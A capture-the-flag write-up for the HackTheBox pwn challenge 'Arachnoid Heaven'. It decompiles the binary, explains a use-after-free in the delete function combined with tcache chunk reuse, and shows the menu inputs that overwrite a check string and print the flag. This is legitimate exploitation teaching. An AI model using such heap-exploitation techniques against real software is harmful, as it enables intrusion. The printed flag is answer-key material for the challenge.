# (pwn) Arachnoid Heaven

### Proof of Concept

The TL;DR for this chall is that the program incorrectly frees memory in a way such that we are able to chain a UAF with the way that tcache bins work to get the flag!
 
### Vulnerability Explanation

We are given a single binary file for this challenge: `arachnoid_heaven`. 

Running file on it gives us the following: 

```bash
[~/arachnoid_heaven]$ file arachnoid_heaven 
arachnoid_heaven: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=257b92e99fc3cf519d91ed1c9ef66676820e238b, not stripped

```

With such we should check the security features enabled on the binary:

```bash
[~/arachnoid_heaven]$ checksec arachnoid_heaven 
[*] '/arachnoid_heaven/arachnoid_heaven'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

Ok great, now we need to play around with the binary and see what behavior we can get from it. Running it you get the following menu: 

```bash 
🕸️ 🕷️  Welcome to Arachnoid Heaven! 🕷️ 🕸️

     🔩🔩🔩🔩🔩🔩🔩🔩🔩🔩🔩🔩🔩🔩
     🔩                        🔩
     🔩  1. Craft  arachnoid   🔩
     🔩  2. Delete arachnoid   🔩
     🔩  3. View   arachnoid   🔩
     🔩  4. Obtain arachnoid   🔩
     🔩  5. Exit               🔩
     🔩                        🔩
     🔩🔩🔩🔩🔩🔩🔩🔩🔩🔩🔩🔩🔩🔩

>
```

This offers the user 5 different options for using the program. You can craft, delete, view, and obtain arachnoids, and exit. Let's open the binary in Ghidra and examine the code. 

In main, we can see that 4 functions are called via a switch statement. Those are: 

1. `craft_arachnoid()`
2. `delete_arachnoid()`
3. `view_arachnoid()`
4. `obtain_arachnoid()`

Let's examine the code of each of these functions to get a better understanding of what's happening under the hood. 

*`craft_arachnoid`* 

This function allocates memory for a new arachnoid, and then increments the `arachnoidCount` variable by one. Nothing sticks out as blatantly exploitable so lets move along to the others. 

```c
void craft_arachnoid(void) {  
  ppvVar2 = (void **)malloc(0x10);
  pvVar3 = malloc(0x28);
  *ppvVar2 = pvVar3;
  pvVar3 = malloc(0x28);
  ppvVar2[1] = pvVar3;
  printf("%s","\nName: ");
  read(0,*ppvVar2,0x14);

  /* Copy "bad" to he name for the arachnoid */
  strcpy((char *)ppvVar2[1],defaultCode);
  lVar4 = (long)(int)arachnoidCount;
  pvVar3 = ppvVar2[1];
  *(void **)(arachnoids + lVar4 * 0x80) = *ppvVar2;
  *(void **)(arachnoids + lVar4 * 0x80 + 8) = pvVar3;
  printf("Arachnoid Index: %d\n\n",(ulong)arachnoidCount);
  arachnoidCount = arachnoidCount + 1;
  
  /* Stack canary check removed */
  return;
}
```

*`delete_arachnoid`*

This is the key function to pay attention to. This frees the memory for a created spider but doesn't do anything to the `arachnoid_count`. Additionally, it frees the 
```c
void delete_arachnoid(void) {
	printf("Index: ");
	read(0,local_12,2);
	uVar1 = atoi(local_12);
	lVar2 = (long)(int)uVar1 * 0x80;
	printf("Arachnoid %d:\n\nName: %s\nCode: %s\n",(ulong)uVar1,*(void **)(arachnoids + lVar2),
	     *(undefined8 *)(arachnoids + lVar2 + 8));
	if (((int)uVar1 < 0) || (arachnoidCount <= (int)uVar1)) {
		puts("Invalid Index!");
	}
	else {

		/* AHA! This is vewry interesting */
		/* This free results in some dangling pointers */
		/* Specifically, this leads to a UAF */
		free(*(void **)(arachnoids + lVar2));
		free(*(void **)(arachnoids + lVar2 + 8));
	}
	/* Stack canary check removed */
	return;
}
```

*`view_arachnoid`* 

I'm not going to talk through this as there isn't anything significant here.

*`obtain_arachnoid`*

This is very clearly our win function. If we can set the name to "spid3y" then we cat the flag and we're done. The only problem is that this value is set to "bad" initially. 

```c
void obtain_arachnoid(void) {
  puts("Arachnoid: ");
  read(0,local_12,2);
  iVar1 = atoi(local_12);
  if ((iVar1 < 0) || (arachnoidCount <= iVar1)) {
    puts("Invalid Index!");
  }
  else {

  	/* Spicy! This is what we need to set the name as */
    iVar1 = strncmp(*(char **)(arachnoids + (long)iVar1 * 0x80 + 8),"sp1d3y",6);
    if (iVar1 == 0) {
      system("cat flag.txt");
    }
    else {
      puts("Unauthorised!");
    }
  }
  return;
}
```

*Putting it all together*

Ok so we now know that there is a UAF and that we need to set the name to "sp1d3y". There was another key aspect to this challenge that has not been mentioned yet. In current Linux systems, the way that memory is freed is using a tcache bin. This article from Azeria Labs gives pretty good insight into how the algorithm works. But essentially, these bins are made avaliable after free is called, and can be overwritten by other bins before it. We can take advantage of this fact and use it to overwrite the "bad" string in the name!

### Solvers/Scripts Used

Since this was so trivial to do I didn't spend time automating however here is the chain of commands used to get the flag!

```bash
🕸️ 🕷️  Welcome to Arachnoid Heaven! 🕷️ 🕸️

     🔩🔩🔩🔩🔩🔩🔩🔩🔩🔩🔩🔩🔩🔩
     🔩                        🔩
     🔩  1. Craft  arachnoid   🔩
     🔩  2. Delete arachnoid   🔩
     🔩  3. View   arachnoid   🔩
     🔩  4. Obtain arachnoid   🔩
     🔩  5. Exit               🔩
     🔩                        🔩
     🔩🔩🔩🔩🔩🔩🔩🔩🔩🔩🔩🔩🔩🔩

> 1

Name: test
Arachnoid Index: 0


     🔩🔩🔩🔩🔩🔩🔩🔩🔩🔩🔩🔩🔩🔩
     🔩                        🔩
     🔩  1. Craft  arachnoid   🔩
     🔩  2. Delete arachnoid   🔩
     🔩  3. View   arachnoid   🔩
     🔩  4. Obtain arachnoid   🔩
     🔩  5. Exit               🔩
     🔩                        🔩
     🔩🔩🔩🔩🔩🔩🔩🔩🔩🔩🔩🔩🔩🔩

> 2
Index: 0
Arachnoid 0:

Name: test

Code: bad

     🔩🔩🔩🔩🔩🔩🔩🔩🔩🔩🔩🔩🔩🔩
     🔩                        🔩
     🔩  1. Craft  arachnoid   🔩
     🔩  2. Delete arachnoid   🔩
     🔩  3. View   arachnoid   🔩
     🔩  4. Obtain arachnoid   🔩
     🔩  5. Exit               🔩
     🔩                        🔩
     🔩🔩🔩🔩🔩🔩🔩🔩🔩🔩🔩🔩🔩🔩

> 1

Name: sp1d3y
Arachnoid Index: 1


     🔩🔩🔩🔩🔩🔩🔩🔩🔩🔩🔩🔩🔩🔩
     🔩                        🔩
     🔩  1. Craft  arachnoid   🔩
     🔩  2. Delete arachnoid   🔩
     🔩  3. View   arachnoid   🔩
     🔩  4. Obtain arachnoid   🔩
     🔩  5. Exit               🔩
     🔩                        🔩
     🔩🔩🔩🔩🔩🔩🔩🔩🔩🔩🔩🔩🔩🔩

> 3
Arachnoid 0:
Name: bad
Code: sp1d3y

Arachnoid 1:
Name: sp1d3y

Code: bad

     🔩🔩🔩🔩🔩🔩🔩🔩🔩🔩🔩🔩🔩🔩
     🔩                        🔩
     🔩  1. Craft  arachnoid   🔩
     🔩  2. Delete arachnoid   🔩
     🔩  3. View   arachnoid   🔩
     🔩  4. Obtain arachnoid   🔩
     🔩  5. Exit               🔩
     🔩                        🔩
     🔩🔩🔩🔩🔩🔩🔩🔩🔩🔩🔩🔩🔩🔩

> 4 
Arachnoid: 

HTB{l3t_th3_4r4chn01ds_fr3333}
```